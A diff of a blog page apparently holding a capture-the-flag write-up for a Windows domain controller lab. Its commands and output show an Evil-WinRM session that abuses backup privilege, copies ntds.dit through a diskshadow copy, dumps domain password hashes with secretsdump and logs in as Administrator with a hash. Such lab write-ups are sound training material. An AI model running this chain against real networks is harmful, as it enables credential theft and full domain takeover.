+</span></span><span style="display:flex;"><span>	    New File  		      34	root.txt
+</span></span><span style="display:flex;"><span>2020/06/10 20:42:33 ERROR 5 (0x00000005) Copying File C:\Users\Administrator\Desktop\root.txt
+</span></span><span style="display:flex;"><span>Access is denied.
+</span></span></code></pre></div><ol start="4">
 <li>And we got <code>notes.txt</code>:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\windows\temp&gt; cat notes.txt
-Mates,
-
-After the domain compromise and computer forensic last week, auditors advised us to:
-- change every passwords -- Done.
-- change krbtgt password twice -- Done.
-- disable auditor&#39;s account (audit2020) -- KO.
-- use nominative domain admin accounts instead of this one -- KO.
-
-We will probably have to backup &amp; restore things later.
-- Mike.
-
-PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
-</code></pre></div><ol start="5">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>*Evil-WinRM* PS C:\windows\temp&gt; cat notes.txt
+</span></span><span style="display:flex;"><span>Mates,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>After the domain compromise and computer forensic last week, auditors advised us to:
+</span></span><span style="display:flex;"><span>- change every passwords -- Done.
+</span></span><span style="display:flex;"><span>- change krbtgt password twice -- Done.
+</span></span><span style="display:flex;"><span>- disable auditor&#39;s account (audit2020) -- KO.
+</span></span><span style="display:flex;"><span>- use nominative domain admin accounts instead of this one -- KO.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>We will probably have to backup &amp; restore things later.
+</span></span><span style="display:flex;"><span>- Mike.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
+</span></span></code></pre></div><ol start="5">
 <li>Exploiting sebackup. Upload <a href="https://github.com/giuliano108/SeBackupPrivilege.git">SeBackupPrivilegeCmdLets</a>:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Temp&gt; upload SeBackupPrivilegeCmdLets.dll
-Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\Temp\SeBackupPrivilegeCmdLets.dll                                                 
-Data: 16384 bytes of 16384 bytes copied
-Info: Upload successful!
-
-*Evil-WinRM* PS C:\Temp&gt; upload SeBackupPrivilegeUtils.dll
-Info: Uploading SeBackupPrivilegeUtils.dll to C:\Temp\SeBackupPrivilegeUtils.dll
-Data: 21844 bytes of 21844 bytes copied
-Info: Upload successful!
-
-*Evil-WinRM* PS C:\Temp&gt; ls
-
-
-    Directory: C:\Temp
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----        7/25/2020   8:51 PM          12288 SeBackupPrivilegeCmdLets.dll
--a----        7/25/2020   8:52 PM          16384 SeBackupPrivilegeUtils.dll
-
-
-*Evil-WinRM* PS C:\Temp&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll
-*Evil-WinRM* PS C:\Temp&gt; Import-Module .\SeBackupPrivilegeUtils.dll
-</code></pre></div><ol start="6">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; upload SeBackupPrivilegeCmdLets.dll
+</span></span><span style="display:flex;"><span>Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\Temp\SeBackupPrivilegeCmdLets.dll                                                 
+</span></span><span style="display:flex;"><span>Data: 16384 bytes of 16384 bytes copied
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; upload SeBackupPrivilegeUtils.dll
+</span></span><span style="display:flex;"><span>Info: Uploading SeBackupPrivilegeUtils.dll to C:\Temp\SeBackupPrivilegeUtils.dll
+</span></span><span style="display:flex;"><span>Data: 21844 bytes of 21844 bytes copied
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:\Temp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   8:51 PM          12288 SeBackupPrivilegeCmdLets.dll
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   8:52 PM          16384 SeBackupPrivilegeUtils.dll
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; Import-Module .\SeBackupPrivilegeUtils.dll
+</span></span></code></pre></div><ol start="6">
 <li>Create a copy using diskshadow (btw add a character to the end of each line in diskshadow.txt. I don&rsquo;t know why that is&hellip;)</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Temp&gt; cmd /c diskshadow /s diskshadow.txt
-Microsoft DiskShadow version 1.0
-Copyright (C) 2013 Microsoft Corporation
-On computer:  DC01,  7/25/2020 9:17:13 PM
-
--&gt; set context persistent nowriters
--&gt; set verbose on
--&gt; add volume c: alias systemVolumeShadow
--&gt; create
-
-Alias systemVolumeShadow for shadow ID {67c55918-9309-4b18-9a08-141cff9a9897} set as environment variable.
-Alias VSS_SHADOW_SET for shadow set ID {087ef168-1fb1-4af9-ae2d-8ca4948f1590} set as environment variable.
-Inserted file Manifest.xml into .cab file 2020-07-25_21-17-15_DC01.cab
-Inserted file DisDB9C.tmp into .cab file 2020-07-25_21-17-15_DC01.cab
-
-Querying all shadow copies with the shadow copy set ID {087ef168-1fb1-4af9-ae2d-8ca4948f1590}
-
-	* Shadow copy ID = {67c55918-9309-4b18-9a08-141cff9a9897}		%systemVolumeShadow%
-		- Shadow copy set: {087ef168-1fb1-4af9-ae2d-8ca4948f1590}	%VSS_SHADOW_SET%
-		- Original count of shadow copies = 1
-		- Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
-		- Creation time: 7/25/2020 9:17:15 PM
-		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
-		- Originating machine: DC01.BLACKFIELD.local
-		- Service machine: DC01.BLACKFIELD.local
-		- Not exposed
-		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
-		- Attributes:  No_Auto_Release Persistent No_Writers Differential
-
-Number of shadow copies listed: 1
--&gt; expose %systemVolumeShadow% z:
--&gt; %systemVolumeShadow% = {67c55918-9309-4b18-9a08-141cff9a9897}
-The shadow copy was successfully exposed as z:\.
--&gt;
-*Evil-WinRM* PS C:\Temp&gt; z:
-*Evil-WinRM* PS Z:\&gt; ls
-
-
-    Directory: Z:\
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-----        5/26/2020   5:38 PM                PerfLogs
-d-----         6/3/2020   9:47 AM                profiles
-d-r---        3/19/2020  11:08 AM                Program Files
-d-----         2/1/2020  11:05 AM                Program Files (x86)
-d-----        7/25/2020   9:17 PM                Temp
-d-r---        2/23/2020   9:16 AM                Users
-d-----        5/28/2020   9:34 AM                Windows
-
-
-*Evil-WinRM* PS Z:\&gt; cd Windows
-*Evil-WinRM* PS Z:\Windows&gt; cd ntds
-*Evil-WinRM* PS Z:\Windows\ntds&gt; ls
-
-
-    Directory: Z:\Windows\ntds
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----         6/6/2020   8:35 AM           8192 edb.chk
--a----        7/25/2020   9:16 PM       10485760 edb.log
--a----        2/23/2020   3:13 AM       10485760 edbres00001.jrs
--a----        2/23/2020   3:13 AM       10485760 edbres00002.jrs
--a----        2/23/2020   9:41 AM       10485760 edbtmp.log
--a----        7/25/2020   8:48 PM       18874368 ntds.dit
--a----        7/25/2020   9:08 PM          16384 ntds.jfm
--a----        7/25/2020   8:48 PM         434176 temp.edb
-
-
-*Evil-WinRM* PS Z:\Windows\ntds&gt; Set-SeBackupPrivilege
-*Evil-WinRM* PS Z:\Windows\ntds&gt; Copy-FileSebackupPrivilege ntds.dit c:\temp\ntds.dit
-*Evil-WinRM* PS Z:\Windows\ntds&gt; reg save hklm\system C:\temp\system.bak
-The operation completed successfully.
-
-*Evil-WinRM* PS Z:\Windows\ntds&gt; cd c:\Temp
-*Evil-WinRM* PS C:\Temp&gt; ls
-
-
-    Directory: C:\Temp
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----        7/25/2020   9:17 PM            629 2020-07-25_21-17-15_DC01.cab
--a----        7/25/2020   9:16 PM            130 diskshadow.txt
--a----        7/25/2020   9:25 PM       18874368 ntds.dit
--a----        7/25/2020   8:51 PM          12288 SeBackupPrivilegeCmdLets.dll
--a----        7/25/2020   8:52 PM          16384 SeBackupPrivilegeUtils.dll
--a----        7/25/2020   9:28 PM       17346560 system.bak
-
-
-*Evil-WinRM* PS C:\Temp&gt;
-</code></pre></div><ol start="7">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; cmd /c diskshadow /s diskshadow.txt
+</span></span><span style="display:flex;"><span>Microsoft DiskShadow version 1.0
+</span></span><span style="display:flex;"><span>Copyright (C) 2013 Microsoft Corporation
+</span></span><span style="display:flex;"><span>On computer:  DC01,  7/25/2020 9:17:13 PM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-&gt; set context persistent nowriters
+</span></span><span style="display:flex;"><span>-&gt; set verbose on
+</span></span><span style="display:flex;"><span>-&gt; add volume c: alias systemVolumeShadow
+</span></span><span style="display:flex;"><span>-&gt; create
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Alias systemVolumeShadow for shadow ID {67c55918-9309-4b18-9a08-141cff9a9897} set as environment variable.
+</span></span><span style="display:flex;"><span>Alias VSS_SHADOW_SET for shadow set ID {087ef168-1fb1-4af9-ae2d-8ca4948f1590} set as environment variable.
+</span></span><span style="display:flex;"><span>Inserted file Manifest.xml into .cab file 2020-07-25_21-17-15_DC01.cab
+</span></span><span style="display:flex;"><span>Inserted file DisDB9C.tmp into .cab file 2020-07-25_21-17-15_DC01.cab
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Querying all shadow copies with the shadow copy set ID {087ef168-1fb1-4af9-ae2d-8ca4948f1590}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	* Shadow copy ID = {67c55918-9309-4b18-9a08-141cff9a9897}		%systemVolumeShadow%
+</span></span><span style="display:flex;"><span>		- Shadow copy set: {087ef168-1fb1-4af9-ae2d-8ca4948f1590}	%VSS_SHADOW_SET%
+</span></span><span style="display:flex;"><span>		- Original count of shadow copies = 1
+</span></span><span style="display:flex;"><span>		- Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
+</span></span><span style="display:flex;"><span>		- Creation time: 7/25/2020 9:17:15 PM
+</span></span><span style="display:flex;"><span>		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
+</span></span><span style="display:flex;"><span>		- Originating machine: DC01.BLACKFIELD.local
+</span></span><span style="display:flex;"><span>		- Service machine: DC01.BLACKFIELD.local
+</span></span><span style="display:flex;"><span>		- Not exposed
+</span></span><span style="display:flex;"><span>		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+</span></span><span style="display:flex;"><span>		- Attributes:  No_Auto_Release Persistent No_Writers Differential
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Number of shadow copies listed: 1
+</span></span><span style="display:flex;"><span>-&gt; expose %systemVolumeShadow% z:
+</span></span><span style="display:flex;"><span>-&gt; %systemVolumeShadow% = {67c55918-9309-4b18-9a08-141cff9a9897}
+</span></span><span style="display:flex;"><span>The shadow copy was successfully exposed as z:\.
+</span></span><span style="display:flex;"><span>-&gt;
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; z:
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS Z:\&gt; ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: Z:\
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----        5/26/2020   5:38 PM                PerfLogs
+</span></span><span style="display:flex;"><span>d-----         6/3/2020   9:47 AM                profiles
+</span></span><span style="display:flex;"><span>d-r---        3/19/2020  11:08 AM                Program Files
+</span></span><span style="display:flex;"><span>d-----         2/1/2020  11:05 AM                Program Files (x86)
+</span></span><span style="display:flex;"><span>d-----        7/25/2020   9:17 PM                Temp
+</span></span><span style="display:flex;"><span>d-r---        2/23/2020   9:16 AM                Users
+</span></span><span style="display:flex;"><span>d-----        5/28/2020   9:34 AM                Windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS Z:\&gt; cd Windows
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS Z:\Windows&gt; cd ntds
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS Z:\Windows\ntds&gt; ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: Z:\Windows\ntds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----         6/6/2020   8:35 AM           8192 edb.chk
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   9:16 PM       10485760 edb.log
+</span></span><span style="display:flex;"><span>-a----        2/23/2020   3:13 AM       10485760 edbres00001.jrs
+</span></span><span style="display:flex;"><span>-a----        2/23/2020   3:13 AM       10485760 edbres00002.jrs
+</span></span><span style="display:flex;"><span>-a----        2/23/2020   9:41 AM       10485760 edbtmp.log
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   8:48 PM       18874368 ntds.dit
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   9:08 PM          16384 ntds.jfm
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   8:48 PM         434176 temp.edb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS Z:\Windows\ntds&gt; Set-SeBackupPrivilege
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS Z:\Windows\ntds&gt; Copy-FileSebackupPrivilege ntds.dit c:\temp\ntds.dit
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS Z:\Windows\ntds&gt; reg save hklm\system C:\temp\system.bak
+</span></span><span style="display:flex;"><span>The operation completed successfully.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS Z:\Windows\ntds&gt; cd c:\Temp
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:\Temp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   9:17 PM            629 2020-07-25_21-17-15_DC01.cab
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   9:16 PM            130 diskshadow.txt
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   9:25 PM       18874368 ntds.dit
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   8:51 PM          12288 SeBackupPrivilegeCmdLets.dll
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   8:52 PM          16384 SeBackupPrivilegeUtils.dll
+</span></span><span style="display:flex;"><span>-a----        7/25/2020   9:28 PM       17346560 system.bak
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt;
+</span></span></code></pre></div><ol start="7">
 <li>Download the artifacts:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Temp&gt; download ntds.dit
-Info: Downloading C:\Temp\ntds.dit to ntds.dit
-
-
-Info: Download successful!
-
-*Evil-WinRM* PS C:\Temp&gt; download system.bak
-Info: Downloading C:\Temp\system.bak to system.bak
-
-
-Info: Download successful!
-
-*Evil-WinRM* PS C:\Temp&gt;
-</code></pre></div><ol start="8">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; download ntds.dit
+</span></span><span style="display:flex;"><span>Info: Downloading C:\Temp\ntds.dit to ntds.dit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Download successful!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; download system.bak
+</span></span><span style="display:flex;"><span>Info: Downloading C:\Temp\system.bak to system.bak
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Download successful!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt;
+</span></span></code></pre></div><ol start="8">
 <li>Extract the secrets:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">secretsdump.py -ntds ntds.dit -system system.bak LOCAL
-Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
-
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
-audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
-support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
-</code></pre></div><h2 id="administrator">Administrator</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>secretsdump.py -ntds ntds.dit -system system.bak LOCAL
+</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
+</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+</span></span><span style="display:flex;"><span>audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
+</span></span><span style="display:flex;"><span>support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+</span></span></code></pre></div><h2 id="administrator">Administrator</h2>
 <ol>
 <li>Connect with hash and try to read <code>root.txt</code>:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u administrator -i 10.10.10.192
-
-Evil-WinRM shell v2.3
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
-*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
-
-
-    Directory: C:\Users\Administrator\Desktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----        2/28/2020   4:36 PM            447 notes.txt
--ar---        7/25/2020   8:49 PM             34 root.txt
-
-
-*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
-1bfa3157fa8e8df6b43bf792ad37ff22
-*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u administrator -i 10.10.10.192
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v2.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:\Users\Administrator\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        2/28/2020   4:36 PM            447 notes.txt
+</span></span><span style="display:flex;"><span>-ar---        7/25/2020   8:49 PM             34 root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>1bfa3157fa8e8df6b43bf792ad37ff22
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;
+</span></span></code></pre></div>
             </div>
         </article>
 
@@ -2240,7 +2231,7 @@ Mode                LastWriteTime         Length Name
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2022</span>
             
             <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
             <span> <a href="http://foxmaccloud.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
@@ -2261,8 +2252,7 @@ Mode                LastWriteTime         Length Name
 
 
 
-
-<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+<script type="text/javascript" src="/bundle.min.feebdc8d801e3fb1791305e362b6d11557f029604dd5b3c27e2686bc88787ee90ae1ccf0afe81bd7d959d7617cfe1fc73062aa82b4e1fa830d6941193d2cbddf.js" integrity="sha512-/uvcjYAeP7F5EwXjYrbRFVfwKWBN1bPCfiaGvIh4fukK4czwr&#43;gb19lZ12F8/h/HMGKqgrTh&#43;oMNaUEZPSy93w=="></script>
 
 
 
